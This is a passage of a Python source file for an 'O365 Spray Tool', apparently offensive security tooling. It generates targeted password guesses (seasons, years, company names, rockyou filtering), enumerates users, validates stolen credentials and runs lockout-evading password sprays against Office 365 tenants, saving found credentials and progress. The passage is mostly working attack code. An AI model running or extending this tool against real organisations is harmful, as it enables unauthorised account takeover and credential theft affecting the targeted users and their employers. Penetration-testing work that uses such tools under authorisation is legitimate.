def generate_password_list(policy: Dict, output_file: str = 'targeted_passwords.txt',
                          source_dict: str = '/vapt/passwords/rockyou.txt',
                          max_passwords: int = 1000, smart_only: bool = False):
    """
    Generate a targeted password list based on policy requirements
    Filters source dictionary and adds smart targeted passwords
    """
    print(f"\n[*] Generating targeted password list based on policy...")

    passwords = []
    min_length = policy.get('password_requirements', {}).get('min_length', 8)
    max_length = policy.get('password_requirements', {}).get('max_length', 256)
    domain = policy.get('domain', '')

    # Get current date info
    current_year = datetime.now().year
    current_month = datetime.now().month

    print(f"[*] Password Requirements:")
    print(f"    - Minimum Length: {min_length}")
    print(f"    - Maximum Length: {max_length}")

    # Generate smart targeted passwords first (highest priority)
    print(f"\n[*] Generating smart targeted passwords...")
    smart_passwords = []

    # Season-based passwords
    seasons = ['Winter', 'Spring', 'Summer', 'Fall', 'Autumn']
    for season in seasons:
        for year in [current_year, current_year - 1, current_year + 1]:
            smart_passwords.append(f"{season}{year}!")
            smart_passwords.append(f"{season}{year}")

    # Month-based
    months = ['January', 'February', 'March', 'April', 'May', 'June',
              'July', 'August', 'September', 'October', 'November', 'December']
    current_month_name = months[current_month - 1]
    for year in [current_year, current_year - 1]:
        smart_passwords.append(f"{current_month_name}{year}!")
        smart_passwords.append(f"{current_month_name}{year}")

    # Company-specific
    if domain:
        company = domain.split('.')[0].capitalize()
        smart_passwords.extend([
            f"{company}{current_year}!",
            f"{company}{current_year}",
            f"{company}123!",
            f"{company}123",
            f"Welcome{company}!",
            f"Welcome{company}",
            f"{company}@{current_year}",
            f"{company}Password!",
            f"{company}Password",
            f"{company.upper()}{current_year}!",
            f"{company.lower()}{current_year}!"
        ])

    # Common enterprise passwords
    smart_passwords.extend([
        'Welcome123!',
        'Password123!',
        f'Password{current_year}!',
        f'Welcome{current_year}!',
        'Changeme123!',
        'Password1!',
        'Welcome1!',
        'P@ssw0rd123',
        'P@ssword123!',
        'Admin123!',
        'P@ssw0rd',
        'P@ssword1',
        f'Welcome{current_year}',
        f'Password{current_year}',
        'Winter2024!',
        'Summer2024!',
        'Spring2024!',
        'Fall2024!',
        'Monday123!',
        'Friday123!'
    ])

    # Filter smart passwords by length requirements
    smart_passwords = [p for p in smart_passwords if min_length <= len(p) <= max_length]
    smart_passwords = list(dict.fromkeys(smart_passwords))  # Remove duplicates

    print(f"[+] Generated {len(smart_passwords)} smart targeted passwords")

    passwords.extend(smart_passwords)

    # If smart_only flag, skip dictionary filtering
    if smart_only:
        print(f"[*] Smart-only mode: Skipping dictionary filtering")
    else:
        # Filter source dictionary
        if Path(source_dict).exists():
            print(f"\n[*] Filtering passwords from: {source_dict}")
            print(f"[*] This may take a moment for large dictionaries...")

            filtered_count = 0
            try:
                # Try different encodings
                encodings = ['utf-8', 'latin-1', 'iso-8859-1']
                dict_passwords = []

                for encoding in encodings:
                    try:
                        with open(source_dict, 'r', encoding=encoding, errors='ignore') as f:
                            line_count = 0
                            for line in f:
                                line_count += 1
                                password = line.strip()

                                # Filter by length
                                if min_length <= len(password) <= max_length:
                                    # Skip if already in smart passwords
                                    if password not in smart_passwords:
                                        dict_passwords.append(password)
                                        filtered_count += 1

                                # Progress indicator
                                if line_count % 100000 == 0:
                                    print(f"    Processed {line_count:,} passwords... (found {filtered_count:,} valid)")

                                # Limit to max_passwords from dictionary
                                if filtered_count >= max_passwords:
                                    break

                        print(f"[+] Successfully loaded with {encoding} encoding")
                        break

                    except UnicodeDecodeError:
                        continue

                print(f"[+] Filtered {filtered_count} passwords from dictionary meeting requirements")
                passwords.extend(dict_passwords)

            except Exception as e:
                print(f"[-] Error filtering dictionary: {e}")
                print(f"[*] Continuing with smart passwords only")
        else:
            print(f"[-] Dictionary file not found: {source_dict}")
            print(f"[*] Continuing with smart passwords only")

    # Remove any duplicates and preserve order
    seen = set()
    unique_passwords = []
    for pwd in passwords:
        if pwd not in seen:
            seen.add(pwd)
            unique_passwords.append(pwd)

    passwords = unique_passwords

    # Save to file
    try:
        with open(output_file, 'w') as f:
            f.write('\n'.join(passwords))
        print(f"\n[+] Generated {len(passwords)} total passwords")
        print(f"[+] Saved to: {output_file}")

        # Show preview
        print(f"\n[*] Preview (first 15):")
        for i, pwd in enumerate(passwords[:15], 1):
            print(f"  {i}. {pwd}")

        if len(passwords) > 15:
            print(f"  ... and {len(passwords) - 15} more")

        return passwords
    except Exception as e:
        print(f"[-] Error saving password list: {e}")
        return passwords


class SprayProgress:
    """Track and restore password spray progress"""

    def __init__(self, progress_file: str = '.spray_progress.json'):
        self.progress_file = progress_file
        self.progress_data = {
            'current_round': 0,
            'current_password_index': 0,
            'completed_passwords': [],
            'valid_creds': [],
            'locked_accounts': [],
            'tested_combinations': [],
            'start_time': None,
            'last_update': None
        }

    def load(self) -> bool:
        """Load progress from file if exists"""
        if Path(self.progress_file).exists():
            try:
                with open(self.progress_file, 'r') as f:
                    self.progress_data = json.load(f)
                return True
            except Exception as e:
                print(f"[-] Error loading progress: {e}")
                return False
        return False

    def save(self):
        """Save current progress"""
        try:
            self.progress_data['last_update'] = datetime.now().isoformat()
            with open(self.progress_file, 'w') as f:
                json.dump(self.progress_data, f, indent=2)
        except Exception as e:
            print(f"[-] Error saving progress: {e}")

    def update(self, **kwargs):
        """Update progress data"""
        self.progress_data.update(kwargs)
        self.save()

    def add_valid_cred(self, username: str, password: str, status: str):
        """Add a valid credential"""
        self.progress_data['valid_creds'].append({
            'username': username,
            'password': password,
            'status': status,
            'timestamp': datetime.now().isoformat()
        })
        self.save()

    def add_locked_account(self, username: str):
        """Add a locked account"""
        if username not in self.progress_data['locked_accounts']:
            self.progress_data['locked_accounts'].append(username)
            self.save()

    def mark_password_complete(self, password: str):
        """Mark a password as fully tested"""
        if password not in self.progress_data['completed_passwords']:
            self.progress_data['completed_passwords'].append(password)
            self.save()

    def is_tested(self, username: str, password: str) -> bool:
        """Check if combination was already tested"""
        combo = f"{username}:{password}"
        return combo in self.progress_data['tested_combinations']

    def mark_tested(self, username: str, password: str):
        """Mark combination as tested"""
        combo = f"{username}:{password}"
        if combo not in self.progress_data['tested_combinations']:
            self.progress_data['tested_combinations'].append(combo)

    def get_resume_point(self) -> Tuple[int, int]:
        """Get the point to resume from"""
        return (
            self.progress_data['current_round'],
            self.progress_data['current_password_index']
        )

    def clear(self):
        """Clear progress file"""
        if Path(self.progress_file).exists():
            Path(self.progress_file).unlink()

    def get_stats(self) -> Dict:
        """Get progress statistics"""
        return {
            'valid_creds': len(self.progress_data['valid_creds']),
            'locked_accounts': len(self.progress_data['locked_accounts']),
            'tested_combinations': len(self.progress_data['tested_combinations']),
            'completed_passwords': len(self.progress_data['completed_passwords']),
            'current_round': self.progress_data['current_round']
        }

def load_file(filepath: str) -> List[str]:
    """Load lines from a file, stripping whitespace and handling various encodings"""
    try:
        # Try UTF-8 first
        with open(filepath, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except UnicodeDecodeError:
        # Fall back to latin-1 (which accepts all byte values)
        try:
            with open(filepath, 'r', encoding='latin-1') as f:
                lines = [line.strip() for line in f if line.strip()]
                print(f"[!] Warning: File {filepath} loaded with latin-1 encoding (non-UTF-8 characters found)")
                return lines
        except Exception as e:
            # Last resort: try with errors='ignore' to skip problematic characters
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [line.strip() for line in f if line.strip()]
                    print(f"[!] Warning: File {filepath} loaded with UTF-8 (ignoring invalid characters)")
                    return lines
            except Exception as e2:
                print(f"[-] Error reading file {filepath}: {e2}")
                sys.exit(1)
    except FileNotFoundError:
        print(f"[-] Error: File not found: {filepath}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error reading file {filepath}: {e}")
        sys.exit(1)

def parse_credentials(filepath: str) -> List[Tuple[str, str]]:
    """Parse username:password format from file"""
    creds = []
    lines = load_file(filepath)

    for line in lines:
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2:
                creds.append((parts[0].strip(), parts[1].strip()))

    return creds

def main():
    banner = """
    ╔═══════════════════════════════════════════════════════════╗
    ║                  O365 Spray Tool v2.0                      ║
    ║            Enumeration | Validation | Spraying            ║
    ╚═══════════════════════════════════════════════════════════╝
    """
    print(banner)

    parser = argparse.ArgumentParser(
        description='O365 Password Spraying and Enumeration Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Validate domain with full recon and policy extraction
  python3 o365_spray.py --validate -d target.com -o recon_report -v

  # Validate and generate targeted password list
  python3 o365_spray.py --validate -d target.com -o recon --generate-passwords

  # Use custom dictionary for password generation
  python3 o365_spray.py --validate -d target.com -o recon --generate-passwords -p /custom/dict.txt

  # Enumerate valid users
  python3 o365_spray.py --enum -u users.txt -d target.com -o valid_users.txt

  # Validate credentials from file
  python3 o365_spray.py --check-creds -c creds.txt -o valid_creds.txt

  # Password spray with progress tracking
  python3 o365_spray.py --spray -u users.txt -p passwords.txt --count 1 --delay 30 -o results.txt

  # Resume interrupted spray
  python3 o365_spray.py --spray -u users.txt -p passwords.txt --count 1 --delay 30 -o results.txt
        """
    )

    # Mode selection
    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument('--validate', action='store_true', help='Validate if domain uses O365 (includes full recon + policy)')
    mode.add_argument('--enum', action='store_true', help='Username enumeration mode')
    mode.add_argument('--check-creds', action='store_true', help='Credential validation mode')
    mode.add_argument('--spray', action='store_true', help='Password spraying mode')

    # Input files
    parser.add_argument('-u', '--usernames', help='File containing usernames (one per line)')
    parser.add_argument('-p', '--passwords', help='File containing passwords or source dictionary for filtering')
    parser.add_argument('-P', '--password', help='Single password to test')
    parser.add_argument('-c', '--credentials', help='File with username:password format')
    parser.add_argument('-d', '--domain', help='Domain for validation/enumeration (e.g., target.com)')

    # Enumeration options
    parser.add_argument('--method', choices=['office', 'activesync', 'onedrive'],
                       default='office', help='Enumeration method (default: office)')

    # Password policy and generation options
    parser.add_argument('--generate-passwords', action='store_true',
                       help='Generate targeted password list based on policy (use with --validate)')
    parser.add_argument('--max-passwords', type=int, default=1000,
                       help='Maximum passwords to extract from dictionary (default: 1000)')
    parser.add_argument('--smart-only', action='store_true',
                       help='Only use smart targeted passwords, skip dictionary filtering')

    # Spray options
    parser.add_argument('--count', type=int, default=1,
                       help='Number of password attempts per user per round (default: 1)')
    parser.add_argument('--delay', type=int, default=30,
                       help='Minutes to wait between spray rounds (default: 30)')
    parser.add_argument('--delay-user', type=int, default=2,
                       help='Min seconds between users (default: 2)')
    parser.add_argument('--delay-user-max', type=int, default=5,
                       help='Max seconds between users (default: 5)')
    parser.add_argument('--resume', action='store_true',
                       help='Resume from previous spray progress (default behavior)')
    parser.add_argument('--no-resume', action='store_true',
                       help='Start fresh spray, ignore previous progress')

    # Output
    parser.add_argument('-o', '--output', help='Output file for results')

    # General options
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    # Validation mode - Check if domain uses O365 with full reconnaissance and policy
    if args.validate:
        if not args.domain:
            parser.error("--validate requires -d/--domain")

        validator = O365DomainValidator(verbose=args.verbose)
        results = validator.validate_domain(args.domain)

        # Generate password list if requested
        if args.generate_passwords and results.get('password_policy', {}).get('policy'):
            print("\n" + "="*60)
            print("GENERATING TARGETED PASSWORD LIST")
            print("="*60)

            policy = results['password_policy']['policy']

            # Determine output filename
            if args.output:
                base_output = args.output.replace('.json', '').replace('_summary.txt', '').replace('_summary', '')
                password_file = f"{base_output}_passwords.txt"
            else:
                password_file = f"{args.domain.split('.')[0]}_passwords.txt"

            # Determine source dictionary
            source_dict = args.passwords if args.passwords else '/vapt/passwords/rockyou.txt'

            passwords = generate_password_list(
                policy,
                password_file,
                source_dict=source_dict,
                max_passwords=args.max_passwords,
                smart_only=args.smart_only
            )

            recommendations = results['password_policy'].get('recommendations', {})

            print(f"\n[+] Ready to spray with optimized parameters:")
            print(f"    python o365_spray.py --spray \\")
            print(f"        -u users.txt \\")
            print(f"        -p {password_file} \\")
            print(f"        --count {recommendations.get('attempts_per_round', 1)} \\")
            print(f"        --delay {recommendations.get('delay_between_rounds', 30)} \\")
            print(f"        -o results.txt")

        # Save results to JSON and summary
        if args.output:
            # Save JSON report
            json_file = args.output if args.output.endswith('.json') else f"{args.output}.json"
            try:
                with open(json_file, 'w') as f:
                    json.dump(results, f, indent=2)
                print(f"\n[+] JSON report saved to: {json_file}")
            except Exception as e:
                print(f"\n[-] Error saving JSON report: {e}")

            # Also save a human-readable summary
            txt_file = json_file.replace('.json', '_summary.txt')
            try:
                with open(txt_file, 'w') as f:
                    f.write(f"O365 Validation Report: {results['domain']}\n")
                    f.write(f"{'='*60}\n")
                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"{'='*60}\n\n")

                    f.write(f"Uses O365: {results['is_o365']}\n")
                    f.write(f"Tenant ID: {results.get('tenant_id', 'N/A')}\n\n")

                    f.write("BASIC CHECKS:\n")
                    f.write("-" * 60 + "\n")
                    for check_name, check_data in results['checks'].items():
                        f.write(f"\n{check_name.upper()}:\n")
                        f.write(f"  Valid: {check_data.get('valid')}\n")
                        if 'message' in check_data:
                            f.write(f"  Message: {check_data['message']}\n")
                        if 'details' in check_data and check_data['details']:
                            f.write(f"  Details:\n")
                            for key, value in check_data['details'].items():
                                f.write(f"    {key}: {value}\n")

                    if 'reconnaissance' in results and results['reconnaissance']:
                        f.write(f"\n\n{'='*60}\n")
                        f.write("EXTENDED RECONNAISSANCE\n")
                        f.write(f"{'='*60}\n")

                        # Tenant Details
                        if 'tenant_details' in results['reconnaissance']:
                            tenant = results['reconnaissance']['tenant_details']
                            if 'openid_v2' in tenant:
                                f.write("\nTenant Configuration:\n")
                                f.write("-" * 40 + "\n")
                                for key, value in tenant['openid_v2'].items():
                                    if value:
                                        f.write(f"  {key}: {value}\n")

                        # Associated Domains
                        if 'associated_domains' in results['reconnaissance']:
                            domains = results['reconnaissance']['associated_domains']
                            if isinstance(domains, list):
                                f.write(f"\nAssociated Domains ({len(domains)}):\n")
                                f.write("-" * 40 + "\n")
                                for d in domains:
                                    f.write(f"  - {d}\n")

                        # Applications
                        if 'applications' in results['reconnaissance']:
                            apps = results['reconnaissance']['applications']
                            if isinstance(apps, dict):
                                f.write(f"\nAccessible Applications: {apps.get('total_accessible', 0)}\n")
                                f.write("-" * 40 + "\n")

                                if apps.get('known_apps'):
                                    f.write("\nKnown Microsoft Applications:\n")
                                    for app in apps['known_apps']:
                                        f.write(f"  - {app['name']}\n")
                                        f.write(f"    Client ID: {app['client_id']}\n")

                                if apps.get('custom_apps'):
                                    f.write(f"\nPotential Custom Applications: {len(apps['custom_apps'])}\n")
                                    for app in apps['custom_apps'][:10]:  # Top 10
                                        f.write(f"  - {app.get('potential_redirect_uri', 'Unknown')}\n")

                        # Username Patterns
                        if 'username_patterns' in results['reconnaissance']:
                            patterns_data = results['reconnaissance']['username_patterns']
                            if isinstance(patterns_data, dict):
                                patterns = patterns_data.get('patterns', [])
                                f.write(f"\nUsername Format Patterns ({len(patterns)} discovered):\n")
                                f.write("-" * 40 + "\n")
                                if patterns:
                                    for p in patterns[:10]:  # Top 10
                                        f.write(f"  - {p['pattern']}: {p['confidence']}% confidence ")
                                        f.write(f"({p['matches']}/{p['attempts']} matches)\n")
                                else:
                                    f.write("  No patterns discovered with test names\n")

                        # Guest Access
                        if 'guest_access' in results['reconnaissance']:
                            guest = results['reconnaissance']['guest_access']
                            if isinstance(guest, dict):
                                f.write("\nGuest Access & Misconfigurations:\n")
                                f.write("-" * 40 + "\n")
                                f.write(f"  Guest Users Allowed: {guest.get('guest_users_allowed', False)}\n")

                                if guest.get('external_domains_found'):
                                    f.write(f"  External Domains Found: {len(guest['external_domains_found'])}\n")
                                    for domain in guest['external_domains_found']:
                                        f.write(f"    - {domain}\n")

                                if guest.get('oauth_misconfigurations'):
                                    f.write(f"  OAuth Misconfigurations: {len(guest['oauth_misconfigurations'])}\n")
                                    for misconfig in guest['oauth_misconfigurations']:
                                        f.write(f"    - {misconfig.get('type', 'Unknown')}: ")
                                        f.write(f"{misconfig.get('description', 'N/A')} ")
                                        f.write(f"(Risk: {misconfig.get('risk', 'unknown')})\n")

                    # Password Policy Section
                    if 'password_policy' in results and 'policy' in results['password_policy']:
                        f.write(f"\n\n{'='*60}\n")
                        f.write("PASSWORD POLICY ANALYSIS\n")
                        f.write(f"{'='*60}\n")

                        policy = results['password_policy']['policy']
                        recommendations = results['password_policy'].get('recommendations', {})

                        f.write("\nPassword Requirements:\n")
                        f.write("-" * 40 + "\n")
                        if policy.get('password_requirements'):
                            req = policy['password_requirements']
                            f.write(f"  Minimum Length: {req.get('min_length', 8)} characters\n")
                            f.write(f"  Maximum Length: {req.get('max_length', 256)} characters\n")

                            if req.get('guidance'):
                                guidance = req['guidance']
                                f.write(f"  Recommendation: {guidance.get('recommendation', 'N/A')}\n")
                                f.write(f"  Banned List: {guidance.get('banned_list', 'N/A')}\n")

                        f.write("\nLockout Policy:\n")
                        f.write("-" * 40 + "\n")
                        if policy.get('lockout_policy'):
                            lockout = policy['lockout_policy']
                            f.write(f"  Threshold: {lockout.get('estimated_threshold', 'Unknown')} attempts\n")
                            f.write(f"  Duration: {lockout.get('lockout_duration', 'Unknown')}\n")
                            if lockout.get('notes'):
                                f.write(f"  Notes: {lockout['notes']}\n")

                        if policy.get('smart_lockout', {}).get('enabled'):
                            f.write("\nSmart Lockout: ENABLED\n")
                            f.write("-" * 40 + "\n")
                            smart = policy['smart_lockout']
                            if smart.get('features'):
                                f.write("  Features:\n")
                                for feature in smart['features']:
                                    f.write(f"    - {feature}\n")

                            if smart.get('recommendations'):
                                f.write("  Recommendations:\n")
                                for rec in smart['recommendations']:
                                    f.write(f"    - {rec}\n")

                        if policy.get('mfa_status', {}).get('enforced'):
                            f.write("\n⚠ MFA: ENFORCED\n")
                            f.write("-" * 40 + "\n")
                            f.write("  Valid credentials may still require MFA\n")

                        f.write("\nSpray Attack Recommendations:\n")
                        f.write("-" * 40 + "\n")
                        if recommendations:
                            f.write(f"  Delay Between Rounds: {recommendations.get('delay_between_rounds', 30)} minutes\n")
                            f.write(f"  Attempts Per Round: {recommendations.get('attempts_per_round', 1)}\n")
                            f.write(f"  Delay Between Users: {recommendations.get('delay_between_users', 5)} seconds\n")

                            if recommendations.get('risk_assessment'):
                                f.write("\n  Risk Assessment:\n")
                                for key, value in recommendations['risk_assessment'].items():
                                    f.write(f"    {key.replace('_', ' ').title()}: {value}\n")

                            if recommendations.get('password_requirements', {}).get('recommended_patterns'):
                                patterns = recommendations['password_requirements']['recommended_patterns']
                                f.write(f"\n  Recommended Password Patterns ({len(patterns)}):\n")
                                for pattern in patterns[:15]:  # Top 15
                                    f.write(f"    - {pattern}\n")
                                if len(patterns) > 15:
                                    f.write(f"    ... and {len(patterns) - 15} more\n")

                    f.write(f"\n{'='*60}\n")
                    f.write("END OF REPORT\n")
                    f.write(f"{'='*60}\n")

                print(f"[+] Summary report saved to: {txt_file}")
            except Exception as e:
                print(f"\n[-] Error saving summary report: {e}")

        # Exit with appropriate code
        sys.exit(0 if results['is_o365'] else 1)

    # Enumeration mode
    elif args.enum:
        if not args.usernames or not args.domain:
            parser.error("--enum requires -u/--usernames and -d/--domain")

        usernames = load_file(args.usernames)
        enumerator = O365Enum(args.domain, verbose=args.verbose)
        results = enumerator.enumerate_users(
            usernames,
            method=args.method,
            delay=args.delay_user,
            output_file=args.output
        )

    # Credential validation mode
    elif args.check_creds:
        if not args.credentials:
            parser.error("--check-creds requires -c/--credentials")

        credentials = parse_credentials(args.credentials)
        if not credentials:
            print("[-] No valid credentials found in file (expected format: username:password)")
            sys.exit(1)

        validator = O365Validator(verbose=args.verbose)
        results = validator.validate_list(
            credentials,
            delay=args.delay_user,
            output_file=args.output
        )

    # Spray mode
    elif args.spray:
        if not args.usernames:
            parser.error("--spray requires -u/--usernames")

        if not args.passwords and not args.password:
            parser.error("--spray requires either -p/--passwords or -P/--password")

        usernames = load_file(args.usernames)

        if args.password:
            passwords = [args.password]
        else:
            passwords = load_file(args.passwords)

        # Determine resume behavior
        resume = not args.no_resume

        sprayer = O365Sprayer(
            delay_min=args.delay_user,
            delay_max=args.delay_user_max,
            verbose=args.verbose
        )

        results = sprayer.spray(
            usernames,
            passwords,
            count=args.count,
            delay_spray=args.delay,
            output_file=args.output,
            resume=resume
        )


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Fatal error: {e}")
        import traceback
        if '--verbose' in sys.argv or '-v' in sys.argv:
            traceback.print_exc()
        sys.exit(1)
